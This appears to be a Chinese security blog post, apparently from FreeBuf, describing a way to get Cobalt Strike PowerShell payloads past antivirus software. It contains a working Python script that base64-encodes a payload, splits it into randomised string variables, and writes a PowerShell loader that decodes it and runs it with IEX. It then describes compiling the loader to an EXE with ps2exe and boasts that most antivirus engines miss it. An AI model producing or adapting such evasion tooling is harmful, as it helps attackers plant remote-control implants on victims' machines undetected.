### 前言

昨天在freebuf上看到了一篇文章,讲的是使用ps2exe将powershell.ps1文件,编译成为可执行的EXE文件.原文链接如下:<https://www.freebuf.com/articles/system/290918.html>

于是想到自己之前的使用base64对powershell进行免杀,就想讲这两个结合起来玩一下.

### 正文

    
    
    #encoding:utf-8
    import os
    import sys
    import re
    import base64
    import random
    PATH=input("请输入Payload路径:")
    #读取文件
    with open (PATH,"r+") as payload:
        encode=payload.read()
    Before_encode=re.findall("function (.*)",encode,re.S)
    Tmp_encode="function "+Before_encode[0]
    Temp_encode=base64.b64encode(Tmp_encode.encode('utf-8'))
    After_encode=str(Temp_encode)
    After_encode=After_encode[2:-1]
    Split_Chr=random.randint(65,122)
    while Split_Chr >= 91 and Split_Chr<=96:
        Split_Chr=random.randint(65,122)
    Split_Chr=chr(Split_Chr)
    Final_encode=After_encode.split(Split_Chr)
    Len=len(Final_encode)
    Long_str=''
    for i in range(0,Len-1):
        Final_encode[i]=Final_encode[i]+Split_Chr
        Long_str=Long_str+"$Doit"+str(i)+"+"
    #写入新的ps1,此时已经免杀
    Long_str=Long_str[0:-1]+"+$Doit"+str(Len-1)
    Destion=input("请输入输出目标:")
    with open(Destion,"a+") as payload:
        payload.writelines("Set-StrictMode -Version 2 \n")
        for i in range(0,Len):
            payload.writelines("$Doit"+str(i)+"='"+Final_encode[i]+"'\n")
        payload.writelines("$testforwindow=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("+Long_str+")) \n")
        payload.writelines("If ([IntPtr]::size -eq 8) {"+'\n')
        payload.writelines("IEX $testforwindow"+'\n')
        payload.writelines("}")

代码功能可以自己研究下,使用方法如下

1️⃣Cobaltstrike生成Powerhsell Payload

![](https://image.3001.net/images/20211110/1636552308_618bce74bb57aa87d499d.jpg!small)2️⃣运行Python代码,进行随机的Base64免杀,运行过程如下

![](https://image.3001.net/images/20211110/1636552341_618bce95bd7a7e485d434.jpg!small)3️⃣因为每次生成的文件都是随机的,所以我们上传到Virustotal的查杀结果都是随机的。

以下是查杀的结果,偶尔会有

![](https://image.3001.net/images/20211110/1636552361_618bcea9cf47aed859709.jpg!small)4️⃣通过使用ps2exe文件将生成的powershell.ps1文件编译成可执行的exe文件

这边我们根据自己的需求,来生成可执行的EXE文件

![](https://image.3001.net/images/20211110/1636552457_618bcf09046db314fa9b4.png!small)5️⃣最终生成一个可执行的EXE文件,经测试,过了大部分杀软,并且因为随机性,一个被查杀了,随机再生成其他的依旧过除了Windows
Defender以外的杀软

![](https://image.3001.net/images/20211110/1636552397_618bcecd091d20d086e29.jpg!small)![](https://image.3001.net/images/20211110/1636552480_618bcf20c7ecac56eddf7.jpg!small)6️⃣
后续优化,可以考虑将Python和ps2exe命令行结合在一起,一步到位,不需要用人家写的winps2exe程序,但是由于时间问题,暂时搁置.

